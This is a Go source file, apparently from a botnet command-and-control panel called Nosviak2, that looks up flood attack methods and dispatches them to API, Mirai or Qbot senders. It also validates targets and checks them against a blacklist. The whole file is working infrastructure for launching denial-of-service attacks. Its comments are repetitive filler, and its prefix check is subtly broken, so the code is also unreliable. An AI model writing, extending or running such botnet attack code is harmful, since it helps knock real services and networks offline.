package attacks

import (
	"Nosviak2/core/configs/models"
	"Nosviak2/core/sources/layouts/json"
	"Nosviak2/core/sources/layouts/toml"
	"net"
	"net/url"
	"regexp"
	"strings"
)

//stores the information properly
//this will ensure its done without any errors
type Method struct { //stored inside a structure properly
	Enabled bool
	Permissions []string
	Name, Description string
	Options *models.Options

	//stores the attack type
	//this will allow for support for different senders properly
	// 1 = API launched attack, 2 = Mirai launched attack
	Type int //stores the type without any issues

	//stores the api based launched protocol
	//this will be what we launch via properly
	ApiInterface models.RequestLaunched	

	//stores the mirai interface properly
	//this will store the mirai id properly without issues
	MiraiInteface int //method id properly
	MiraiPortInterface int //method port id flag	

	//stores the qbot arguments properly
	//this will ensure its done without errors
	QbotArguments []string //stores the argument
}

//tries to get the method properly
//this will ensure its done without any errors happening
func QueryMethod(method string) *Method { //returns the query properly
	//ranges through all api floods
	//this will send via a json flood properly
	for methodName, value := range json.AttacksJson { //ranges through
		//checks properly without issues happening on purpose without errors
		if strings.ToLower(method) == methodName { //compares properly without any errors
			return &Method{Options: value.Options, Name: methodName, Description: value.Description, Permissions: value.Permissions, Enabled: value.Enabled, Type: 1, ApiInterface: value.Target}
		} //returns the value properly without any errors happening ensures a safer launch
	}

	//ranges through all mirai floods properly
	//this will launch via mirai methods properly safely
	for methodName, value := range json.MiraiAttacksJson { //ranges through
		//checks properly without issues happening on purpose without errors
		if strings.ToLower(method) == methodName { //compares properly without any errors
			return &Method{Options: value.Options, Name: methodName, Description: value.Description, Permissions: value.Permissions, Enabled: value.Enabled, Type: 2, MiraiInteface: value.MethodID, MiraiPortInterface: value.PortFlagID}
		} //returns the value properly without any errors happening ensures a safer launch
	}

	//ranges through all mirai floods properly
	//this will launch via mirai methods properly safely
	for methodName, value := range json.QbotAttacksJson { //ranges through
		//checks properly without issues happening on purpose without errors
		if strings.ToLower(method) == methodName { //compares properly without any errors
			return &Method{Options: value.Options, Name: methodName, Description: value.Description, Permissions: value.Permissions, Enabled: value.Enabled, Type: 3, QbotArguments: value.Args}
		} //returns the value properly without any errors happening ensures a safer launch
	}

	return nil
}

//checks if its the value or a flag
//if its a flag we will return true else we will ignore
func Defaulter(i string) bool { //returns a boolean type
	return ValidateAttackPrefix(i, toml.AttacksToml.Attacks.KVPrefix)
}

//properly checks for the attack prefix
//this will ensure its done without issues happening
func ValidateAttackPrefix(cmd string, prefix string) bool { //returns true if valid
	//ranges through the cmd properly
	//this will ensure its done without errors
	for p := 0; p < len(cmd) && p < len(prefix); p++ { //for loops properly
		//compares the prefix information properly without issues
		if cmd[p] == prefix[p] { //compares both
			return true //returns true as its properly and safe
		}
	}
	//returns false as its invalid
	return false //false as its invalid
}

//this will store the information properly
//allows for better control without issues happening
func CheckBlacklist(target string) (bool, error) { //returns boolean if target is blacklisted
	//ranges through the toml config properly
	//this will check each object without issues
	for _, host := range toml.Blacklisting.Ips { //checks ip
		//compiles the regexp properly
		//makes sure its done without issues
		m, err := regexp.MatchString(host, target) //checks reg properly
		if err != nil { //error handles properly without issues happening
			return false, err //returns the error properly without issues happening
		}
		//checks if its true
		//this will return properly
		if m { //detects true properly
			return true, nil //returns true
		}
	}; 

	//ranges through the toml config properly
	//this will check each object without issues
	for _, host := range toml.Blacklisting.Domains { //checks ip
		//compiles the regexp properly
		//makes sure its done without issues
		m, err := regexp.MatchString(host, target) //checks reg properly
		if err != nil { //error handles properly without issues happening
			return false, err //returns the error properly without issues happening
		}
		//checks if its true
		//this will return properly
		if m { //detects true properly
			return true, nil //returns true
		}
	}; 
	
	return false, nil
}

//returns the group model properly
//this will return the pointer for it properly
func FindGroup(method *Method) *models.Group {
	//ranges through all the groups
	//this will return the value properly
	for _, mth := range toml.AttacksToml.Attacks.Groups {
		if mth.Name == method.Options.Group { //compares
			return &mth //returns the group properly
		}
	}
	return nil
}

//checks if the incoming target is an ip
//this will ensure its odne without errors happening
func IsIP(target string) bool { //returns a boolean properly
	return net.ParseIP(target) != nil
}

//checks if the incoming target is a domain
//this will follow through with the domain attack
func IsURL(ip string) bool { //returns a boolean properly
	u, err := url.ParseRequestURI(ip)
	return u != nil && err == nil
}

func IsDomain(ip string) bool {
	ips, err := Resolver.LookupHost(ip)
	return len(ips) > 0 && err == nil
}

// ValidateTarget will ensure the target is valid
func ValidateTarget(target string) bool {
	return IsIP(target) || IsURL(target) || IsDomain(target)
}